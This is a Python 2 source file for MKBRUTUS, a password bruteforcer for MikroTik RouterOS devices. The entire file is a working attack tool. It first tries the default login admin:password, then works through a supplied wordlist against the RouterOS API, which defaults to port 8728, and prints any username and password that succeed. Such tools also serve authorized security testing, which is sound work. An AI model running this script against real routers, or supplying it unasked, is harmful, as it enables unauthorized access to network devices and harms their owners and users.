# -*- coding: utf-8 -*-

"""
                  _    _  _   _  _____  ____ _   _  ____ _   _ _____
                 |  \/  || | / /| ___ \ ___ \ | | |_   _| | | /  ___|
                 | .  . || |/ / | |_/ / |_/ / | | | | | | | | \ `--.
                 | |\/| ||    \ | ___ \    /| | | | | | | | | |`--. \\
                 | |  | || |\  \| |_/ / |\ \| |_| | | | | |_| /\__/ /
                 \_|  |_/\_| \_/\____/\_| \_|\___/  \_/  \___/\____/
                               Mikrotik RouterOS Bruteforce Tool 1.0.2
                    Ramiro Caire (@rcaire) & Federico Massa (@fgmassa)
                             http://mkbrutusproject.github.io/MKBRUTUS

   Password bruteforcer for MikroTik devices or boxes running RouterOS

 Usage:
     mkbrutus.py [options] <TARGET> <DICT>
     mkbrutus.py -h | --help
     mkbrutus.py --version

 Options:
     -h --help          Show this screen
     --version          Show version
     -p --port=<port>   RouterOS port [default: 8728]
     -u --user=<user>   Username [default: admin]
     -s --seconds=<s>   Delay in seconds between attempts [default: 0]
     -v --verbose       Verbose mode
"""

from docopt import docopt
from time import sleep
from sys import exit
import codecs
from pyprind import ProgBar
from routeros_api import connect, exceptions


def main(args):

    print("\n[-] Trying with default credentials on RouterOS...")
    success = False

    try:
        connect(args['<TARGET>'], 'admin', 'password')
        success = True
    except exceptions.RouterOsApiCommunicationError, e:
        pass
    except exceptions.RouterOsApiConnectionError, e:
        raise e

    if success:
        alert = "[+] Login successful!!!"
        alert += " Default RouterOS credentials were not changed."
        alert += " Log in with admin:password\n"
        print alert
    else:
        print "[-] Default RouterOS credentials were unsuccessful."
        sleep(1)
        msg = "[-] Starting bruteforce attack. "
        msg += "Trying with passwords in list...\n"
        print(msg)

        dict_file = codecs.open(
            args['<DICT>'],
            'rb', encoding='utf-8',
            errors='ignore'
        )

        psswd_count = dict_file.read().count('\n')
        dict_file.seek(0)
        items = 0

        progress_bar = ProgBar(
            psswd_count,
            stream=1,
            title='MKBRUTUS Bruteforce Attack'
        )

        for password in dict_file.readlines():
            password = password.strip('\n\r ')
            items += 1
            if args['--verbose']:
                alert = "[-] Trying {} of {} passwords".format(
                    str(items), str(psswd_count))
                print alert + " - current: " + password

            try:
                connect(args['<TARGET>'], args['--user'], password)
                alert = "\n[+] Login successful!!! "
                alert += "User: " + args['--user'] + ", Password: " + password
                print alert
                success = True
                break
            except exceptions.RouterOsApiCommunicationError, e:
                pass
            except exceptions.RouterOsApiConnectionError, e:
                raise e

            if not args['--verbose']:
                progress_bar.update()
            sleep(int(args['--seconds']))

        dict_file.close()

        res = "\n[+] ATTACK FINISHED! "
        if not success:
            res += "Try again with a different wordlist.\n"
        print res

if __name__ == '__main__':
    try:
        args = docopt(__doc__, version='v1.0.2')
        main(args)
    except KeyboardInterrupt:
        print '\nAborted by user. Exiting... '
        exit(0)
